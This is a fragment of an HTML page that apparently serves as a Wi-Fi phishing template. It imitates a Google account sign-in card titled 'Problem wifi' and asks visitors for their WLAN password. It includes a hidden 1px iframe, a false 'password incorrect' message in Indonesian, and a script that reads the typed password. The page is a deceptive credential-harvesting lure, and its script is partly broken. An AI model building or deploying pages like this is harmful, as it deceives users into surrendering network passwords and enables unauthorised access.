...
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  ...
  <title>Problem wifi – Google Konten</title>
  <style>
  /* cyrillic-ext */
@font-face {
...
<form novalidate="" method="post" action="" id="form1" name="form1">
<div class="card signin-card">
  <div id="cc_iframe_parent"><iframe style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;" src="Anmelden%20%E2%80%93%20Google%20Konten-Dateien/CheckConnection.htm" id="youtube"></iframe></div>
    ...
    <input id="Passwd" name="key1" placeholder="WLAN-Passwort" class="" type="text">
    <span role="alert" class="error-msg" id="errormsg_0_Passwd">terjadi masalah, pastikan password sudah benar.</span>
...
function tekan()
{
   var str = (document.form1.key1.value);

   if (""+str == NULL){
	   window.alert("sukses "+str);
	   window.vibrator(1000);
   }
   else {
       window.alert("sukses "+str);
   }
